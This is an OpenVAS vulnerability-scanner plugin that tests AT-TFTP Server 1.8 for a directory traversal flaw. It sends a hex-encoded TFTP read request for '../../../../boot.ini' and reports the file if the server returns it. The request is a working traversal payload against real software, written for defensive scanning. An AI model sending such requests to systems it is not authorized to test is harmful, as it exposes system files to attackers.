###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_at_tftp_server_dir_trav_vun.nasl 13155 2019-01-18 15:41:35Z cfischer $
#
# AT TFTP Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801543");
  script_version("$Revision: 13155 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-18 16:41:35 +0100 (Fri, 18 Jan 2019) $");
  script_tag(name:"creation_date", value:"2010-11-23 14:41:37 +0100 (Tue, 23 Nov 2010)");
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:P");
  script_name("AT TFTP Server Directory Traversal Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15438/");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Remote file access");
  script_dependencies("tftpd_detect.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_require_keys("tftp/detected", "Host/runs_windows");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary
  files on the affected application.");

  script_tag(name:"affected", value:"AT-TFTP Server version 1.8.");

  script_tag(name:"insight", value:"The flaw is due to an error while handling certain requests
  which can be exploited to download arbitrary files from the host system.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running AT TFTP Server and is prone to directory
  traversal vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

port = get_kb_item("Services/udp/tftp");
if(!port)
  port = 69;

if(!get_udp_port_state(port))
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

raw_data = raw_string(0x00, 0x01, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                      0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x62, 0x6f,
                      0x6f, 0x74, 0x2e, 0x69, 0x6e, 0x69, 0x00, 0x6e,
                      0x65, 0x74, 0x61, 0x73, 0x63, 0x69, 0x69, 0x00);
raw_ack = raw_string(0x00, 0x04, 0x00, 0x01);

send(socket:soc, data:raw_data);
res = recv(socket:soc, length:1000);

if("[boot loader]" >< res && "\WINDOWS" >< res) {
  send(socket:soc, data:raw_ack);
  close(soc);
  report = string("The boot.ini file contains:\n", res);
  security_message(port:port, data:report, proto:"udp");
  exit(0);
}

close(soc);
exit(99);